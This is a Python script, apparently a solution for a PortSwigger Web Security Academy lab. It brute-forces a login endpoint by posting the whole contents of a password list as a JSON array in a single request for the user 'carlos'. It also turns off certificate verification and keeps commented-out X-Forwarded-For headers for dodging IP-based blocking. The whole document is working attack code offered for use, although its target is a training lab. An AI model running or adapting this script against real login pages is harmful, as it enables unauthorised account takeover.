#!/usr/bin/python3
import requests
import warnings, json

# Ignore any and all warnings and don't show it on cmd output
warnings.simplefilter("ignore")

# request body in dictionary
payload = {"username": "wiener", "password": "admin"}
url="https://0af800f203dbc7e080b353ac007c005f.web-security-academy.net/login"
# headers = {"X-Forwarded-For": "192.168.0.2"}

def enum_password(validUsers):
    # List of usernames to enumerate.
    passwords = list()
    # headers = {"X-Forwarded-For": "192.168.40.1"}

    # Read users.lst and store it in a list to be used further
    with open("./passwords.lst", "rt") as passlst:
        for password in passlst.readlines():
            passwords.append(password.strip())
    
    numberOfRequestsBeforeBlockingIP = 0
    for user in validUsers:
        print("[*] For username", user, sep=": ")
        payload["username"] = user # change the placeholder of username field to the user from users list

        payload["password"] = passwords # change the placeholder of password field to the password from passwords list
        print("\t[*] Trying passwords", json.dumps(payload), sep=": ")
        # Send the HTTP POST request to the url
        response = requests.post(url, data=json.dumps(payload), verify=False)
        print(response.status_code)

enum_password(['carlos'])